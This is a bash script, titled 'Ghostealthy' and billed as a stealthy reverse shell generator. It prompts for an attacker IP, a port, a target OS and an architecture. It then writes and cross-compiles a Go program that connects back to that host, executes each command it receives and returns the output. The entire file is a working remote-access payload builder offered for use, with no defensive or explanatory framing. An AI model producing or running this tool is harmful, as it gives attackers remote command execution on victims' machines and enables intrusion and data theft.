#!/bin/bash

echo "  ▄████  ▒█████    ██████ ▄▄▄█████▓▓█████ ▄▄▄       ██▓  ▄▄▄█████▓ ██░ ██▓██   ██▓"
echo " ██▒ ▀█▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒  ▓  ██▒ ▓▒▓██░ ██▒▒██  ██▒"
echo "▒██░▄▄▄░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▒██░  ▒ ▓██░ ▒░▒██▀▀██░ ▒██ ██░"
echo "░▓█  ██▓▒██   ██░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██░  ░ ▓██▓ ░ ░▓█ ░██  ░ ▐██▓░"
echo "░▒▓███▀▒░ ████▓▒░▒██████▒▒  ▒██▒ ░ ░▒████▒▓█   ▓██▒░██████▒▒██▒ ░ ░▓█▒░██▓ ░ ██▒▓░"
echo " ░▒   ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░▒ ░░    ▒ ░░▒░▒  ██▒▒▒ "
echo "  ░   ░   ░ ▒ ▒░ ░ ░▒  ░ ░    ░     ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░  ░     ▒ ░▒░ ░▓██ ░▒░ "
echo "░ ░   ░ ░ ░ ░ ▒  ░  ░  ░    ░         ░    ░   ▒     ░ ░   ░       ░  ░░ ░▒ ▒ ░░  "
echo "      ░     ░ ░        ░              ░  ░     ░  ░    ░  ░        ░  ░  ░░ ░     "
echo 
echo "𝓐 𝓼𝓽𝓮𝓪𝓵𝓽𝓱𝔂 𝓻𝓮𝓿𝓮𝓻𝓼𝓮 𝓼𝓱𝓮𝓵𝓵 𝓰𝓮𝓷𝓮𝓻𝓪𝓽𝓸𝓻"
echo ""
echo ""

read -p "Enter the Reverse IP address: " ip
read -p "Enter the Listening port: " port
read -p "Enter the target OS (e.g., windows, linux, darwin): " os
read -p "Enter the target architecture (e.g., amd64, arm64, 386): " architecture

go_code=$(cat <<EOF
package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	conn, _ := net.Dial("tcp", "$ip:$port")
	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')

		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)
	}
}
EOF
)

echo "$go_code" > rev.go

if [ "$os" = "windows" ]; then
    GOOS="$os" GOARCH="$architecture" go build -o rev.exe rev.go
    echo "Windows Reverse Shell Generated: rev.exe"
else
    GOOS="$os" GOARCH="$architecture" go build -o rev rev.go
    echo "Linux Reverse Shell Generated: rev"
fi
